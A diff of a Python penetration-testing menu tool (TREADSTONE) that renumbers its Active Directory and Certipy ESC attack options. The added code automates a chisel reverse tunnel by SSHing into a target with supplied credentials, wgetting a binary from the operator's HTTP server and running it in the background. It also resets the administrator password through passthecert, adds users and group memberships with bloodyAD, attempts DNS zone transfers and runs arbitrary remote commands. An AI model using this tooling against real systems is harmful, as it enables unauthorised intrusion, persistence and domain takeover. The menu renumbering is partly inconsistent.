@@ -784,21 +784,21 @@ def dispMenu():
 
 # DISPLAY MENU   
 def options():
-   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Kerb Ticket (71) ServScanner (81) GRP Scanner (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (600) RUNCOMMANDLINE (700) Certipy VULN (710) Certipy   ESC10  " + '\u2551')   
-   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Silv Ticket (72) VulnScanner (82) GRP  SHARES (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (601) Enum4Linux     (701) Certipy ESC1 (711) Certipy   ESC11  " + '\u2551')      
-   print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Gold Ticket (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (602) LAPS    Dumper (702) Certipy ESC2                        " + '\u2551')   
-   print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Gold DC PAC (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (603) Secrets   Dump (703) Certipy ESC3                        " + '\u2551')
-   print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) Disp Ticket (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (604) Crack-Map-Exec (704) Certipy ESC4                        " + '\u2551')
-   print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) TARGDRoasting (66) PSExec HASH (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (605) Domain    Dump (705) Certipy ESC5                        " + '\u2551')
-   print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set SERV TIME (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) SmbExecHASH (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (606) Blood    Hound (706) Certipy ESC6 (996) MANUAL CHISEL64  " + '\u2551')
-   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) HTTP GitDump (607) BloodyADd User (707) Certipy ESC7 (997) AUTO   CHISEL64  " + '\u2551')
-   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH (69)             (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449)              (608) BloodyADdGroup (708) Certipy ESC8 (998) SSH PortForward  " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60)               (70)             (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350) LFI     Wordlist (450)              (609) BloodHound GUI (709) Certipy ESC9 (999)", end= ' ')
+   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Kerb Ticket (71) ServScanner (81) GRP Scanner (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DigDNS (600) HTTP GitDumper (700) Certipy VULN (710) Certipy   ESC10  " + '\u2551')   
+   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Silv Ticket (72) VulnScanner (82) GRP  SHARES (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Enum  DOMAIN (601) LAPS    Dumper (701) Certipy ESC1 (711) Certipy   ESC11  " + '\u2551')      
+   print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Gold Ticket (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Recon DOMAIN (602) Secrets   Dump (702) Certipy ESC2 (712) Certipy   ESC12  " + '\u2551')   
+   print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Gold DC PAC (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Enum Sub-DOM (603) Crack-Map-Dump (703) Certipy ESC3 (713) Certify   ESC13  " + '\u2551')
+   print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) Disp Ticket (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) EnumVirtHOST (604) Domain    Dumo (704) Certipy ESC4 (714) Certify   ESC14  " + '\u2551')
+   print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) TARGDRoasting (66) PSExec HASH (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) FUZZ Sub-DOM (605) BloodHoundDump (705) Certipy ESC5 (715) Certify   ESC15  " + '\u2551')
+   print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set SERV TIME (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) SmbExecHASH (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) MAN CHISEL64 (606) BloodyADd User (706) Certipy ESC6 (716) Certify   ESC16  " + '\u2551')
+   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) AUTOCHISEL64 (607) BloodyADdGroup (707) Certipy ESC7 (717) Certify   ESC17  " + '\u2551')
+   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH (69)             (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608)                (708) Certipy ESC8                        " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60) Enum4Linux    (70)             (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240) RunLineCommand  (350) LFI     Wordlist (450)", end= ' ')
    if proxyChains == 1:
-      print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ' + "     " + '\u2551')
+      print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ')
    else:
-      print(menuName.rstrip(" "), end= ' ' + "     " + '\u2551')
-   print("")
+      print(menuName.rstrip(" "), end= ' ')
+   print("(609) BloodHound GUI (709) Certipy ESC9                        " + '\u2551')
    print('\u255A' + '\u2550'*292 + '\u255D')
    return
    
@@ -895,7 +895,7 @@ if os.geteuid() != 0:
    exit(1)
 else:
    proxyChains = 0
-   menuName = "ProxyChains        "
+   menuName = "Proxy Chains"
     
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -2731,6 +2731,25 @@ while True:
          print("[+] Created hash value " + NTM + "...")
          NTM = spacePadding(NTM, COL1)
       prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Enum4Linux
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '60':
+      checkParam = test_TIP()
+      if checkParam != 1:
+         checkParam = test_DOM()
+      if checkParam != 1:
+         print(colored("[*] Attempting to enumerate pease wait...", colour3))
+         localCOM("enum4linux " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ")) 
+      else:
+         localCOM("enum4linux " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" "))
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4014,6 +4033,20 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
+# Details : Menu option selected - Run line command.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '239':
+      print("[?] Please enter the command to run:")
+      lineCommand = input("\n")
+      remoteCOM(lineCommand)
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
 # Details : Menu option selected - Edit usernames.txt.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -4220,24 +4253,19 @@ while True:
       if checkParam != 1:
          print(colored("[*] Checking DNS Server...\n", colour3))         
          remoteCOM("whois -I "  + DNS.rstrip(" "))
+         print(colored("[*] Checking DNS Server...", colour3))
+         remoteCOM("dig axfr @" + TIP.rstrip(" ") + " " + DOM.rstrip(" "))         
       prompt()  
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - DNS ENUMERATION
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection == '442':
-      checkParam = test_DNS()
-      if checkParam != 1:
-         checkParam = test_DOM()
-         if checkParam != 1:
-            print(colored("[*] Checking DNS Server...", colour3))
-            remoteCOM("dig axfr @" + TIP.rstrip(" ") + " " + DOM.rstrip(" "))
-#           remoteCOM("dig SOA " + DOM.rstrip(" ") + " @" + TIP.rstrip(" "))
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -4248,7 +4276,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
-   if selection == '443':
+   if selection == '442':
       checkParam = test_DOM()      
       if checkParam != 1:
          print(colored("[*] Checking DOMAIN Server...", colour3))
@@ -4263,7 +4291,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
-   if selection == '444':      
+   if selection == '443':      
       checkParam = test_TIP()
       if checkParam != 1:
          checkParam = test_DOM()         
@@ -4282,7 +4310,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '445':
+   if selection == '444':
       checkParam = test_DNS()
       if checkParam != 1:
          checkParam = test_DOM()         
@@ -4299,7 +4327,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '446':
+   if selection == '445':
       checkParam = test_WEB()
       if checkParam != 1:
          print(colored("[*] Scanning for vhosts, please wait this can take sometime...", colour3))
@@ -4314,14 +4342,131 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '447':
+   if selection == '446':
       checkParam = test_WEB()
       if checkParam != 1:
          print(colored("[*] Fuzzing for subdomains, please wait this can take sometime...", colour3))
          remoteCOM("wfuzz -c -f subdomains.tmp -w " + currentWordlist + " -u '" + WEB.rstrip(" ") + "' -H 'Host:FUZZ." + DOM.rstrip(" ")+"' " + FuzzRider.rstrip(" ") + " 2>&1 > dump.tmp")
          catsFile("subdomains.tmp")
       prompt() 
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Start local linux/windows chisel server
+# Modified: N/A
+# -------------------------------------------------------------------------------------
 
+   if selection == '447':
+      if OSF[:5] == "LINUX":      
+         portChoice = input("[?] Please enter the receiving port number: ")
+         if portChoice.isnumeric():
+            targetChoice = input("[?] Please enter the target port number: ")
+            if targetChoice.isnumeric():
+               print(colored("[*] Starting local linux chisel server...", colour3))
+               print("[!] Use the command: ./lin_chisel64 client " + localIP2.rstrip(" ") + ":" + portChoice + " R:" + targetChoice + ":127.0.0.1:" + targetChoice + " on the remote machine...")
+               localCOM("xdotool key Ctrl+Shift+T")
+               localCOM("xdotool key Alt+Shift+S; xdotool type 'LINUX CHISEL SERVER'; xdotool key Return")
+               dispBanner("LINUX CHISEL SERVER",0) 
+               localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+               localCOM("xdotool type './" + httpDir + "/linux/lin_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
+               localCOM("xdotool key Ctrl+Tab")
+      else:
+         portChoice = input("[?] Please enter the receiving port number: ")
+         if portChoice.isnumeric():
+            targetChoice = input("[?] Please enter the target port number: ")
+            if targetChoice.isnumeric():
+               print(colored("[*] Starting local windows chisel server...", colour3))
+               print("[!] Use the command: ./win_chisel64 client " + localIP2.rstrip(" ") + ":" + portChoice + " R:" + targetChoice + ":127.0.0.1:" + targetChoice + " on the remote machine...")
+               localCOM("xdotool key Ctrl+Shift+T")
+               localCOM("xdotool key Alt+Shift+S; xdotool type 'WINDOWS CHISEL SERVER'; xdotool key Return")
+               dispBanner("WINDOWS CHISEL SERVER",0) 
+               localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+               localCOM("xdotool type './" + httpDir + "/windows/win_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
+               localCOM("xdotool key Ctrl+Tab")
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Auto start local linux/windows chisel server
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '448':
+      choice = "python3 -m http.server --bind " + localIP + " 5678"
+      print(colored("[*] Specified local service started...", colour3))
+      localCOM("xdotool key Ctrl+Shift+T")
+      localCOM("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
+      dispBanner("HTTP SERVER",0) 
+      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+      localCOM("xdotool type '" + choice + "'; xdotool key Return")
+      localCOM("xdotool key Ctrl+Tab")
+      portChoice = input("[?] Please enter the receiving port number: ")
+      if portChoice.isnumeric():
+         targetChoice = input("[?] Please enter the target port number: ")
+      if targetChoice.isnumeric():     
+         print(colored("[*] Starting local windows chisel server...", colour3))              
+         localCOM("xdotool key Ctrl+Shift+T")
+         localCOM("xdotool key Alt+Shift+S; xdotool type 'LINUX CHISEL SERVER'; xdotool key Return")
+         dispBanner("LINUX CHISEL SERVER",0) 
+         localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+         localCOM("xdotool type './" + httpDir + "/linux/lin_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
+         localCOM("xdotool key Ctrl+Tab")      
+      print(colored("[*] Connecting to remote server...", colour3))
+      ssh = paramiko.SSHClient()
+      ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+      ssh.connect('' + DOM.rstrip(" "), username='' + USR.rstrip(" "), password='' + PAS.rstrip(" "))      
+      if OSF[:5] == "LINUX":
+            print("[+] Installing lin_chisel64, please wait...")
+            ssh_command("cd /; mkdir tmp")
+            ssh_command("cd /; cd /tmp; wget http://" + localIP2.rstrip(" ") + ":5678/TREADSTONE/linux/lin_chisel64 ./lin_chisel64")
+            print("[+] Starting client services...") 
+            ssh_command("cd  /; cd /tmp; chmod +x ./lin_chisel64 ")
+            ssh_command("cd  /; cd /tmp; ./lin_chisel64 client " + localIP2.rstrip(' ') + ":" + portChoice + " R:" + targetChoice + ":127.0.0.1:" + targetChoice + " > /dev/null 2>&1 &")
+            ssh_command("jobs -l")
+      else:
+         pass
+      ssh.close()
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - SSH Port Forward
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '449':
+      print(colored("[*] Activating SSH Port Forwarding Service...", colour3))   
+      TPORT = input("[?] Please select the target port value: ")
+      if TPORT.isnumeric():
+         print("[*] Use firefox 127.0.0.1:" + TPORT + " to run...")
+         remoteCOM("ssh -L " + TPORT + ":127.0.0.1:" + TPORT + " " + USR.rstrip(" ") + "@" + DOM.rstrip(" "))
+         prompt()
+      else:
+         pass 
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Proxychain ON/OFF [KEEP HERE]
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='450':        
+      if proxyChains == 0:
+         proxyChains = 1
+         print("[+] Proxychains activated...")
+      else:
+         proxyChains = 0
+         print("[-] Proxychains de-activated...")
+      prompt()       
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -4330,47 +4475,13 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '448':
+   if selection == '600':
       checkParam = test_WEB()
       if checkParam != 1:
          print(colored("[*] Dumping the git repositiry, please wait...", colour3))
          remoteCOM("git-dumper '" + WEB.rstrip(" ") + "' " + workDir)         
       prompt() 
       
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected run a command line 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '600':
-      print("[?] Please enter the command to run:")
-      lineCommand = input("\n")
-      remoteCOM(lineCommand)
-      prompt() 
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - enum4linux
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='601':
-      checkParam = test_TIP()
-      if checkParam != 1:
-         checkParam = test_DOM()
-      if checkParam != 1:
-         print(colored("[*] Attempting to enumerate pease wait...", colour3))
-         localCOM("enum4linux " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ")) 
-      else:
-         localCOM("enum4linux " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" "))       
-      prompt()
-
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -4380,7 +4491,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='602':
+   if selection =='601':
       checkParam != test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()  
@@ -4411,7 +4522,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='603':
+   if selection =='602':
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()               
@@ -4468,7 +4579,7 @@ while True:
 # Modified: crackmapexec currently (03/01/2021) has a python3 problem - so this is a work around that still does not terminate properly.
 # -------------------------------------------------------------------------------------
 
-   if selection =='604':
+   if selection =='603':
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()               
@@ -4526,7 +4637,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='605':
+   if selection =='604':
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()               
@@ -4548,7 +4659,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='606':
+   if selection =='605':
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()                     
@@ -4576,7 +4687,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '607':
+   if selection == '606':
       AD1 = input("[?] Please enter new users name: ")
       AD2 = input("[?] Please enter new users password: ")
       localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p " + PAS.rstrip("") + " set password " + AD1.rstrip("") + " " + AD2.rstrip(""))
@@ -4600,7 +4711,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '608':
+   if selection == '607':
       AD1 = input("[?] Please enter new group name: ")
       localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p " + PAS.rstrip("") + " add groupMember '" + AD1.rstrip("") + "' " + USR.rstrip(""))
       prompt() 
@@ -4657,12 +4768,12 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Certipy EC01
+# Details : Menu option selected - Certipy ESC01
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='701':
-      print("[!] ESC1 is when a certificate template permits Client Authentication, and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN)...\n")      
+      print("[!] ESC01 - Enrollable by Low-Privileged Users: Templates allow anyone to request certs with Client Authentication EKU and SAN UPN...\n")      
       checkParams = test_TIP()
       if checkParams != 1:
          checkParams = test_DOM()      
@@ -4684,18 +4795,78 @@ while True:
                localCOM(keyPath + "passthecert.py -crt user.crt -key user.key -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -action modify_user -target administrator -new-pass H@ck3r!!!")
             else:
                print("[-] SeMachineAccountPrivilege is not enabled...")
-      prompt()  
+      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Certipy EC07
+# Details : Menu option selected - Certipy ESC02
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='702':
+      print("[!] ESC02 - No Manager Approval Enforcement: Templates require manager approval, but it's not enforced...\n") 
+      prompt() 
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy ESC03
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='703':
+      print("[!] ESC03 - Subject Name Supply: Templates allow users to specify the certificate’s Subject Name — impersonation risk...\n") 
+      prompt() 
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy ESC04
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='704':
+      print("[!] ESC04 - Dangerous EKUs: Templates include Any Purpose EKU, allowing logon certs from unintended templates...\n") 
+      prompt() 
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy ESC05
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='705':
+      print("[!] ESC05 - Misconfigured CA ACLs: Weak CA permissions allow attackers to issue or manage templates...\n") 
+      prompt() 
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy ESC06
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='706':
+      print("[!] ESC6 - Subordinate CA Abuse: Misconfigurations allow attackers to issue their own certificates as a rogue CA...\n") 
+      prompt()          
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy ESC07
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='707':
-      print("[!] ESC7 is when a user has the Manage CA or Manage Certificates access right on a CA. There are no public techniques that can abuse the Manage Certificates access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests.\n")
+      print("[!] ESC07 Enrollment Agent Abuse: If you can request Enrollment Agent certs, you can enroll on behalf of others.\n")
       checkParams = test_TIP()
       if checkParams != 1:
          checkParams = test_DOM()      
@@ -4733,117 +4904,129 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Start local linux/windows chisel server
+# Details : Menu option selected - Certipy ESC08
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '996':
-      if OSF[:5] == "LINUX":      
-         portChoice = input("[?] Please enter the receiving port number: ")
-         if portChoice.isnumeric():
-            targetChoice = input("[?] Please enter the target port number: ")
-            if targetChoice.isnumeric():
-               print(colored("[*] Starting local linux chisel server...", colour3))
-               print("[!] Use the command: ./lin_chisel64 client " + localIP2.rstrip(" ") + ":" + portChoice + " R:" + targetChoice + ":127.0.0.1:" + targetChoice + " on the remote machine...")
-               localCOM("xdotool key Ctrl+Shift+T")
-               localCOM("xdotool key Alt+Shift+S; xdotool type 'LINUX CHISEL SERVER'; xdotool key Return")
-               dispBanner("LINUX CHISEL SERVER",0) 
-               localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-               localCOM("xdotool type './" + httpDir + "/linux/lin_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
-               localCOM("xdotool key Ctrl+Tab")
-      else:
-         portChoice = input("[?] Please enter the receiving port number: ")
-         if portChoice.isnumeric():
-            targetChoice = input("[?] Please enter the target port number: ")
-            if targetChoice.isnumeric():
-               print(colored("[*] Starting local windows chisel server...", colour3))
-               print("[!] Use the command: ./win_chisel64 client " + localIP2.rstrip(" ") + ":" + portChoice + " R:" + targetChoice + ":127.0.0.1:" + targetChoice + " on the remote machine...")
-               localCOM("xdotool key Ctrl+Shift+T")
-               localCOM("xdotool key Alt+Shift+S; xdotool type 'WINDOWS CHISEL SERVER'; xdotool key Return")
-               dispBanner("WINDOWS CHISEL SERVER",0) 
-               localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-               localCOM("xdotool type './" + httpDir + "/windows/win_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
-               localCOM("xdotool key Ctrl+Tab")
-      prompt()
+   if selection =='708':
+      print("[!] ESC08 - No Security Descriptor: Template has no permissions set — anyone can request certificates...\n") 
+      prompt()      
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Auto start local linux/windows chisel server
+# Details : Menu option selected - Certipy ESC09
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '997':
-      choice = "python3 -m http.server --bind " + localIP + " 5678"
-      print(colored("[*] Specified local service started...", colour3))
-      localCOM("xdotool key Ctrl+Shift+T")
-      localCOM("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
-      dispBanner("HTTP SERVER",0) 
-      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-      localCOM("xdotool type '" + choice + "'; xdotool key Return")
-      localCOM("xdotool key Ctrl+Tab")
-      portChoice = input("[?] Please enter the receiving port number: ")
-      if portChoice.isnumeric():
-         targetChoice = input("[?] Please enter the target port number: ")
-      if targetChoice.isnumeric():     
-         print(colored("[*] Starting local windows chisel server...", colour3))              
-         localCOM("xdotool key Ctrl+Shift+T")
-         localCOM("xdotool key Alt+Shift+S; xdotool type 'LINUX CHISEL SERVER'; xdotool key Return")
-         dispBanner("LINUX CHISEL SERVER",0) 
-         localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-         localCOM("xdotool type './" + httpDir + "/linux/lin_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
-         localCOM("xdotool key Ctrl+Tab")      
-      print(colored("[*] Connecting to remote server...", colour3))
-      ssh = paramiko.SSHClient()
-      ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-      ssh.connect('' + DOM.rstrip(" "), username='' + USR.rstrip(" "), password='' + PAS.rstrip(" "))      
-      if OSF[:5] == "LINUX":
-            print("[+] Installing lin_chisel64, please wait...")
-            ssh_command("cd /; mkdir tmp")
-            ssh_command("cd /; cd /tmp; wget http://" + localIP2.rstrip(" ") + ":5678/TREADSTONE/linux/lin_chisel64 ./lin_chisel64")
-            print("[+] Starting client services...") 
-            ssh_command("cd  /; cd /tmp; chmod +x ./lin_chisel64 ")
-            ssh_command("cd  /; cd /tmp; ./lin_chisel64 client " + localIP2.rstrip(' ') + ":" + portChoice + " R:" + targetChoice + ":127.0.0.1:" + targetChoice + " > /dev/null 2>&1 &")
-            ssh_command("jobs -l")
-      else:
-         pass
-      ssh.close()
-      prompt()
+   if selection =='709':
+      print("[!] ESC09 - NTAuth Store Injection: Adding rogue CAs to the NTAuth store allows unauthorized cert validation...\n") 
